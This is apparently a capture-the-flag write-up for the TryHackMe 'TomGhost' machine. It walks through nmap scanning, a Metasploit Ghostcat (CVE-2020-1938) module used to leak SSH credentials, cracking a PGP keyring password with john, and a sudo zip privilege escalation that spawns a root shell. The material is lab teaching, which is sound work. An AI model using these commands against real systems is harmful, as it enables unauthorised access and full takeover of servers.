# TomGhost

## Step 1: Footprinting/Enumerations

As always use nmap

`nmap -T3 -sC -sV -p- 10.10.90.90`

![nmap result]("")

Here we got the port 53 is port open but it is software protected thats why nmap result shows the tcpwrapper, 8080 and 9001 open and its http port so we can open 8080 port in browser.

![home page of port 8080]("")

here we got nothing intersting so lets research about the hint as given in CTF sub title

Hint: "Identify recent vulnerabilities to try exploit the system or read files that you should not have access to." + Port 8080 Webpage title.

After the research I got a amazing [Reference]("") about this vulnerability. This vulnerability CVE-ID and name is **CVE-2020-1938 - GostCat**.

## Step 2: Attack Begins

There is two way to attack the target.

1. EDB-ID : [Refrence]("")

2. Metasploit

Here we will use Metasploit approach.

start the msfdatabase using below command

`sudo msfdb start`

now lets start msfconsole

`msfconsole -q`

Now search the exploit, use the exploit and see the options

`search Ghostcat`

`use auxiliary/admin/http/tomcat_ghostcat`

![search exploit and show the options]("")

Set the taget IP in RHOSTS and run the exploit

`set RHOSTS 10.10.90.90`

`exploit`

![skyfuck ssh password]("")

Lets try to login this cridentials.

![skyfuck files]("")

After the login we got two file in present directory cridential.pgp and tryhackme.asc

## Research and Dycrypt

lets research about the asc file and how to dycrypt and here i got amazing [Reference]("https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key"). now we need to download this two files using python3 server

start the python3 server into the victim machine and after the server started we need to download the file in our kali machine using wget command.

now try to import the file.

![fail attempt]("")

but we can't import because it ask the password, so we  need to use **John** tool

`pgp2john credintial.txt > hash.txt`

`john hash.txt --wordlist=rockyou.txt`

![asc keyring password]("")

now once again try to import the asc key and dycrypt the cridintial.pgp

![merlin ssh password]("")

Now try to login using this merlin cridintial. and here we got our user first flag.

![user flag]("")

## Step 4: Enumerate for Privilege Escalation

`sudo -l`

here we can use zip command as root user. lets research about for zip exploit. and here I got a [Reference]("https://gtfobins.github.io/gtfobins/zip/#sudo")

`TF=$(mktemp -u)`

`sudo zip $TF /etc/hosts -T -TT 'sh #'`

![root flag]("")

Bingo!!!